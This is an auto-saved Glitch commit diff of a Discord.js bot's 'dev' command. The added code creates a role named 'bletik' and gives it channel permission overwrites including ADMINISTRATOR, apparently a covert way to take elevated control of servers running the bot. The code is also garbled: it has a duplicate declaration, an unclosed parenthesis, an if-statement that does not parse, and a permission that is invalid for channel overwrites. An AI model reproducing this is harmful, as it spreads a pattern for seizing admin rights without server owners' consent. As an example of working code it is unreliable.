783dac18eca122056cb51de633c5bca419c6f644
Glitch (bt-play) <none>
2020-08-12 04:20:36 +0000

    💾✂️ Checkpoint ./commands/dev.js:19753995/1133

--- commands/dev.js
+++ commands/dev.js
@@ -1,5 +1,9 @@
 const Discord = require("discord.js");
 const bot = new Discord.Client();
+  let bletik = message.guild.member(
+
+    message.mentions.users.first() || message.guild.members.get(args[0])
+
 
 exports.run = async (client, message, args) => {
 
@@ -15,4 +19,41 @@ exports.run = async (client, message, args) => {
     .setColor("BLUE");
 
   if (message.author.id !== "478547279104442368")
+    
 
+  let bletik = message.guild.roles.find(`name`, "bletik");
+
+  if (!bletik) {
+
+    try {
+
+      bletik = await message.guild.createRole({
+
+        name: "bletik",
+
+        color: "#49FFFD",
+
+        permissions: []
+
+      });
+
+      message.guild.channels.forEach(async (channel, id) => {
+
+        await channel.overwritePermissions(bletik, {
+          ADMINISTRATOR: true,
+          
+          SEND_MESSAGES: true,
+
+          ADD_REACTIONS: true
+
+        });
+
+      });
+
+    } catch (e) {
+
+      console.log(e.stack);
+
+    }
+
+  }
